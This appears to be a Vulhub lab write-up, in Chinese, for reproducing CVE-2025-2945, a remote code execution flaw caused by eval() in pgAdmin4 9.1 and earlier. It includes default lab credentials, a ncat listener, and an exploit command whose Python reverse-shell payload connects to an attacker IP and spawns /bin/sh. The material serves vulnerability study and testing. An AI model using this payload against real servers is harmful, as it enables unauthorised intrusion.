# pgAdmin4 <= 9.1 后台远程代码执行漏洞 (CVE-2025-2945)

pgAdmin4是一个著名的PostgreSQL数据库管理平台。

pgAdmin4 9.2以下存在一个远程代码执行漏洞。其 /sqleditor/query_tool/download 接口和 /cloud/deploy 接口都直接使用 eval() 解析参数，导致攻击者可以通过接口传入恶意python代码。

参考链接：

- https://nvd.nist.gov/vuln/detail/CVE-2025-2945
- https://github.com/advisories/GHSA-g73c-fw68-pwx3

## 环境

```bash
docker compose up -d
```

然后访问 http://localhost:5050/ 进入pgAdmin4登录页面。pgAdmin4用户名和密码：`vulhub@example.com:vulhub`

触发这个漏洞还需要一个可供pgAdmin4访问的PostgresSQL数据库（用于激活sqleditor功能）。它包含在docker-compose.yml中，并已经添加到了pgAdmin4的服务器列表里，无需配置即可直接利用。数据库用户名和密码：`vulhub:vulhub`。

## 漏洞复现

复现漏洞可以使用metasploit的`exploit/multi/http/pgadmin_query_tool_authenticated`，或者单独的python poc脚本：https://github.com/Cycloctane/cve-2025-2945-poc/blob/main/exp.py

首先监听一个端口等待反弹shell：

```bash
ncat -lvvp 1337
```

然后运行`exp.py`，使用python代码反弹shell，同时传入pgAdmin4的登录凭据（`--username`和`--password`）以及pgAdmin4服务器列表中的Postgres数据库的登录凭据（`--db-user`和`--db-pass`）。

```bash
./exp.py --target-url http://<target-ip>:5050 \
    --username vulhub@example.com --password vulhub \
    --db-user vulhub --db-pass vulhub --db-name vulhub \
    --payload 'exec("import sys,socket,os,pty;s=socket.socket();s.connect((\"<your-ip>\",1337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")")'
```

![exp](1.png)
